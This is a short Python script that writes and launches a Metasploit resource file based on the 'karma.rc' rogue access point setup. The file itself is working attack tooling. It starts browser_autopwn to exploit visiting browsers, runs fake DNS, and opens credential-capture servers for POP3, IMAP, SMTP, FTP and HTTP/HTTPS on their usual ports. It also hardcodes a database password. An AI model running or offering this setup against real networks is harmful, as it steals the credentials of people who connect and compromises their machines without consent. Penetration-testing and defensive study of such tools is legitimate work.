#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#
# author: @090h
from subprocess import Popen

class KarmaServer:
    # wget http://www.offensive-security.com/downloads/karma.rc
    karma_rc = """db_connect postgres:toor@127.0.0.1/msfbook

use auxiliary/server/browser_autopwn

setg AUTOPWN_HOST %s
setg AUTOPWN_PORT 55550
setg AUTOPWN_URI /ads

set LHOST %s
set LPORT 45000
set SRVPORT 55550
set URIPATH /ads
run

use auxiliary/server/capture/pop3
set SRVPORT 110
set SSL false
run

use auxiliary/server/capture/pop3
set SRVPORT 995
set SSL true
run

use auxiliary/server/capture/ftp
run

use auxiliary/server/capture/imap
set SSL false
set SRVPORT 143
run

use auxiliary/server/capture/imap
set SSL true
set SRVPORT 993
run

use auxiliary/server/capture/smtp
set SSL false
set SRVPORT 25
run

use auxiliary/server/capture/smtp
set SSL true
set SRVPORT 465
run

use auxiliary/server/fakedns
unset TARGETHOST
set SRVPORT 5353
run

use auxiliary/server/fakedns
unset TARGETHOST
set SRVPORT 53
run

use auxiliary/server/capture/http
set SRVPORT 80
set SSL false
run

use auxiliary/server/capture/http
set SRVPORT 8080
set SSL false
run

use auxiliary/server/capture/http
set SRVPORT 443
set SSL true
run

use auxiliary/server/capture/http
set SRVPORT 8443
set SSL true
run"""

    def __init__(self, ip='192.168.1.1', config='karma.rc'):
        self.ip, self.config = ip, config

    def __str__(self):
        return self.karma_rc % (self.ip, self.ip)

    def run(self):
        open(self.config, 'w+').write(self.__str__())
        print("Starting Metasploit...")
        Popen(['msfconsole', '-r', self.config]).communicate()
